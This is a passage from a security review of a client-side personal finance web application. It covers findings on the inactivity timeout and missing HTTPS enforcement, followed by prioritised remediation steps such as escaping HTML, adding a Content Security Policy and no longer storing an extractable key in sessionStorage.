The inactivity timer is enforced with `Math.max(60, state.settings?.inactivityTimeoutMinutes || 60)`. The 60-minute minimum is hardcoded in `page-init.js`. However, in `settings-page.js`, the user can set the timeout to any positive number. If the user sets it to, say, 1 minute, the `Math.max(60, 1)` in page-init clamps it to 60 minutes. This is actually correct behaviour. The finding is minor: the user-facing settings field doesn't indicate the minimum is 60 minutes, potentially confusing the user about what is actually enforced.

**What an attacker can do:**
Negligible direct security impact given the clamping, but a confused user might believe shorter timeouts are in effect.

**Remediation:**
Add a hint to the settings field: "Minimum 60 minutes." Or reduce the enforced minimum to allow tighter timeouts (e.g., 15 minutes minimum) which would be more security-friendly.

---

### F-14 — No HTTPS Enforcement or HSTS
**Severity: LOW**
**File:** All pages (no server-side headers)

**Observation:**
As a static client-only application, there are no server-side HTTP headers. There is no Strict-Transport-Security header, no redirect from HTTP to HTTPS, and no `upgrade-insecure-requests` CSP directive. Service Workers require HTTPS (or localhost) to register, so the SW-based key vault would silently fail on HTTP, but there is no user-visible warning about this.

**What an attacker can do:**
If served over HTTP (e.g., a local network deployment or a misconfigured hosting), all traffic including credentials is transmitted in cleartext. Service worker registration would silently fail, breaking authentication.

**Remediation:**
If deployed to a web host, ensure HTTPS is enforced at the hosting layer. Add `upgrade-insecure-requests` to any CSP. Add a startup check that alerts the user if the page is not being served over HTTPS or localhost.

---

## Summary and Recommendations by Priority

### Immediate (do these now)

1. **Remove `sessionStorage._ek` storage.** Set `extractable: false` on the derived key. Force re-authentication when the SW key is lost. This is the highest-impact single code change. (`login.html` line 338–341; `js/auth.js` line 59; `js/page-init.js` lines 15–31)

2. **Apply `escHtml()` consistently to all text fields rendered via innerHTML.** Specifically: `pension.note`, `cash.note`, `ulip.name`, `ulip.insurer`, `indiaLog[n].note`, scheduled change notes, expense names in non-expense-table contexts. (`js/ui.js` lines 362, 563, 574, 598, 779)

3. **Add validation to the JSON import handler.** Allowlist keys to `fin_*` only. Validate `iv:ciphertext` format. (`js/pages/export-page.js` lines 287–291)

### Short-term (next iteration)

4. **Add a Content Security Policy** to all HTML pages with `connect-src 'none'` at minimum.

5. **Add SRI hashes** to all four externally-loaded scripts.

6. **Replace real financial values in `defaults.js`** with zeroed-out or clearly fictional placeholders.

7. **Delete `auth-config.js`** — it is unused and adds confusion.

### Accepted risk (architectural, requires accepting limitations)

8. **Credential hashes in source are an accepted architectural limitation** of a server-less application. Document this explicitly. Mitigate by using a long, high-entropy passphrase. Consider migrating to a server-side authentication model if the threat model expands beyond personal/local use.

9. **Lockout bypass via localStorage is an accepted limitation** of client-side rate limiting. Document it. The PBKDF2 cost provides meaningful in-browser throttling even without lockout enforcement.

10. **Excel export is unencrypted by design.** This is a usability trade-off. Consider adding a pre-export warning dialog.

---

*Review completed by Security Architect. All findings reference actual code observed during review. No exploitation was performed against live data.*
